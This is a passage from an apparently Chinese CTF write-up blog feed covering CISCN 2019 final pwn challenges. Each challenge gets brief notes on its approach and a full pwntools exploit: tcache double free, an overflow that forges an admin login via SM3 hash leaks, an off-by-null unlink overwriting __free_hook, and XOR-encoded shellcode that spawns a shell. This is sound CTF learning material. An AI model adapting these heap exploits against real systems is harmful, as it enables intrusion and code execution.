at all, simply "puts("sorry~\n");" after input done</span></span><br><span class="line"><span class="string">    120 ==&gt; simply write something on the stack (no use at all)</span></span><br><span class="line"><span class="string">    238 ==&gt; first input after "string: " : index</span></span><br><span class="line"><span class="string">            free the chunk that recently malloc (pointer will not be reset to 0, </span></span><br><span class="line"><span class="string">            thus bring double free)</span></span><br><span class="line"><span class="string">    386 ==&gt; simply exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">some global variable:</span></span><br><span class="line"><span class="string">    0x605AC0 ==&gt; store the address of the chunk_array </span></span><br><span class="line"><span class="string">    0x604940 ==&gt; store the address of the present chunk</span></span><br><span class="line"><span class="string">    0x6040E0 ==&gt; store the times that "free" can be used (initialize to 4), if use up,</span></span><br><span class="line"><span class="string">                 the process will print out the chunk_array and simply exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">some constraints:</span></span><br><span class="line"><span class="string">    chunk size should satisfy "size &gt; 0 &amp;&amp; size &lt;= 0x7F"</span></span><br><span class="line"><span class="string">    can only malloc at most 10 chunks (according to the free space in chunk_array)</span></span><br><span class="line"><span class="string">    for "238"(free) function, index should satisfy "index &gt;= 0 &amp;&amp; index &lt;= 9"</span></span><br><span class="line"><span class="string">    "238"(free) function can only be used 4 times (according to the value stored in 0x6040E0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x21b97</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">"atoi"</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">bss = elf.bss(<span class="number">0x1500</span>)</span><br><span class="line">chunk_array_addr = <span class="number">0x605AC0</span></span><br><span class="line">delete_times_addr = <span class="number">0x6040e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">'AAAA'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">'BBBB'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the delete time to 0xAAA</span></span><br><span class="line">new(<span class="number">0x28</span>, p64(delete_times_addr)) </span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">'AAAA'</span>) </span><br><span class="line">new(<span class="number">0x28</span>, p64(<span class="number">0xAAA</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># reset the chunk_array</span></span><br><span class="line">new(<span class="number">0x38</span>, p64(chunk_array_addr)) </span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">'AAAA'</span>) </span><br><span class="line">new(<span class="number">0x38</span>, p64(bss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x48</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x58</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write aoti_got to printf_plt</span></span><br><span class="line">new(<span class="number">0x48</span>, p64(atoi_got)) </span><br><span class="line">new(<span class="number">0x48</span>, <span class="string">'AAAA'</span>) </span><br><span class="line">new(<span class="number">0x48</span>, p64(printf_plt)) </span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"%25$p"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_addr = int(p.recv(<span class="number">14</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr - offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write atoi_got to system</span></span><br><span class="line">new(<span class="number">0x58</span>, p64(atoi_got), <span class="literal">True</span>)</span><br><span class="line">new(<span class="number">0x58</span>, <span class="string">"DDDD"</span>, <span class="literal">True</span>)</span><br><span class="line">new(<span class="number">0x58</span>, p64(libc_system), <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system("/bin/sh")</span></span><br><span class="line">p.sendlineafter(<span class="string">"command&gt;&gt; "</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-8"><a href="#ciscn-final-8" class="headerlink" title="ciscn_final_8"></a>ciscn_final_8</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>乍一看好像挺复杂的，其实仔细看看逻辑挺简单的（但是我还是花了蛮久时间的，太菜了）。</p><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ol><li>在<code>login</code>之后，输入<code>text</code>的长度是可控的而且没有限制，故存在溢出。</li><li>在<code>register</code>一个<code>user</code>的时候，会先对输入的<code>password</code>进行SM3散列计算再储存，然后在输入完<code>text</code>之后，对所有的元数据（包括<code>user</code>的名字，<code>password length</code>，<code>password</code>散列，<code>text_len</code>，<code>text</code>）再进行一次SM3散列计算并储存。</li><li>之后的每次<code>login</code>都会对这两个散列进行检查。</li><li>利用<code>user0</code>的溢出将<code>user1</code>特定的<code>password</code>散列leak出来（比如”0”)。</li><li>利用leak出来的<code>password</code>散列，伪造<code>user2</code>用户输入的<code>password</code>为<code>admin2</code>所有元数据（包括名字<code>admin2</code>，<code>password length</code>（1），<code>password</code>散列（之前leak出来的”0”的散列），<code>text_len</code>，<code>text</code>），该元数据的散列值将会被储存在<code>user2</code>的区域。</li><li>利用<code>user1</code>的溢出leak出上述提到的<code>admin2</code>的所有元数据的散列。</li><li>再次利用<code>user1</code>的溢出覆盖<code>user2</code>为伪造的superuser也就是<code>admin2</code>。</li><li>以<code>user2</code>的身份<code>login</code>，此时便能通过superuser也就是<code>admin2</code>的check条件，达到调用<code>getflag</code>功能的目的。</li></ol><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(age, passwd_len, passwd, content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please set your age:"</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id, passwd_len, passwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, input your id"</span>, str(id))</span><br><span class="line">    p.sendlineafter(<span class="string">"length of passwd?"</span>, str(passwd_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your passwd"</span>, str(passwd))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_content</span><span class="params">(content_len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"first, length of text?"</span>, str(content_len))</span><br><span class="line">    p.sendafter(<span class="string">"ok, input your text"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># register two user</span></span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">0</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># restore the second user</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + <span class="string">'\x00'</span> * <span class="number">0x4</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>) + p32(<span class="number">1</span>) + <span class="string">"user1"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>, <span class="string">"\x00"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test the second user</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"><span class="comment"># login(1, 1, "0")</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reigster the third user</span></span><br><span class="line">password = p64(<span class="number">2</span>) + p32(<span class="number">1</span>) + <span class="string">"admin"</span></span><br><span class="line">password += <span class="string">"2"</span></span><br><span class="line">password = password.ljust(<span class="number">0x24</span>, <span class="string">"\x00"</span>)</span><br><span class="line">password += digest</span><br><span class="line">password += <span class="string">"0"</span></span><br><span class="line">password = password.ljust(<span class="number">0x64</span>, <span class="string">"\x00"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">0x64</span>, password, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">1</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake the third user as admin</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x4C</span></span><br><span class="line">payload += password</span><br><span class="line">payload += digest</span><br><span class="line">set_content(<span class="number">0x84</span> + <span class="number">0x4C</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login as admin</span></span><br><span class="line">quit()</span><br><span class="line">login(<span class="number">2</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-9"><a href="#ciscn-final-9" class="headerlink" title="ciscn_final_9"></a>ciscn_final_9</h1><h2 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h2><p>明显的off by null，通过unlink形成chunk overlap，因为看错了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>判断条件一度怀疑人生（甚至怀疑以前怎么做unlink的）。</p><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><ol><li>分配所有10个chunk，将后面的7个chunk释放并填满tcache bin。</li><li>剩下的三个chunk通过off by null形成chunk overlap，需要满足相应的<code>fd</code>，<code>bk</code>，<code>prev_size</code>字段。</li><li>由于”\x00\x02”(<code>prev_size=0x200</code>)无法直接写进去，这里需要连续释放剩下的3个chunk，使得第三个chunk的<code>prev_size</code>会被写入<code>0x200</code>。</li><li>将所有10个chunk又全部从bin中分配出来。</li><li>释放除了3个上述提到的unsorted bin之外的7个chunk中的6个，以填充6个tcache bin的位置。</li><li>将3个unsorted bin中位于中间位置的chunk释放到tcache bin中，从而下一次分配就能分配到该chunk，将size设置为<code>0x78</code>从而覆盖第三个unsorted bin的<code>prev_inuse</code>标志位为0。</li><li>再次将tcache bin重新填满，释放第一个unsorted bin，满足<code>fd</code>和<code>bk</code>的约束。</li><li>此时再次释放第三个unsorted bin，此时触发unlink，获得0x300的unsorted bin，第二个unsorted bin被overlap，从而可以被二次分配。</li><li>之后就利用tcache double free，写<code>__free_hook</code>为onegadget，触发<code>free</code>来getshell。</li></ol><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size \n&gt; "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content \n&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a38c</span></span><br><span class="line">one_gadget_offset = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">4</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># put chunk 7 into unsorted bin</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"CCCC\n"</span>) <span class="comment"># leave one tacache bin for chunk 8</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># put chunk 8 into tcache bin</span></span><br><span class="line">new(<span class="number">0xF8</span>, <span class="string">"DDDD\n"</span>) <span class="comment"># off by null to chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fill tcache bin</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take all tcache bin out</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"EEEE\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"FFFF\n"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"GGGG\n"</span>) <span class="comment"># chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># prepare enough space</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(__free_hook)) <span class="comment"># chunk 0</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(one_gadget)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-10"><a href="#ciscn-final-10" class="headerlink" title="ciscn_final_10"></a>ciscn_final_10</h1><h2 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h2><p>这个应该巨简单了，根本没难点。</p><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><ol><li>首先要通过check才能进行后续操作，随机数肯定是才不到的，后续只要输入一个低2 bytes为0的负数就能通过check了。</li><li>后面就是明显的tcache double free。</li><li>通过partial write tcache bin，分配到储存<code>The cake is not a lie!</code>的chunk，将其改写为<code>The cake is a lie!</code>。</li><li>之后输入一个无效选项（比如3）触发后续接受输入，在对该输入进行简单的异或操作后当作指令执行的功能。</li><li>对shellcode进行对应的处理之后作为输入，然后就能getshell了。</li></ol><h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    shellcode = [ord(item) <span class="keyword">for</span> item <span class="keyword">in</span> shellcode][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload += chr(shellcode[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += chr(ord(payload[i - <span class="number">1</span>]) ^ shellcode[i])</span><br><span class="line">    <span class="keyword">return</span> payload[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get access right</span></span><br><span class="line">access()</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># change str</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"\x90"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"The cake is a lie!\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt; "</span>, gen_shellcode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwnable.tw做不动了，发现BUUOJ上的题目挺多的，加上想刷一刷2019国赛的题目，这两天断断续续地做了几道题目，简单记录一下。&lt;br&gt;&lt;br&gt;&lt;b&gt;更新：10道刷完，有些题目还是挺有意思的。&lt;/b&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.com/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn fsb: printable</title>
    <link href="https://n0nop.com/2020/04/21/pwn-fsb-printable/"/>
    <id>https://n0nop.com/2020/04/21/pwn-fsb-printable/</id>
    <published>2020-04-21T03:25:00.000Z</published>
    <updated>2020-04-21T04:56:15.317Z</updated>
    
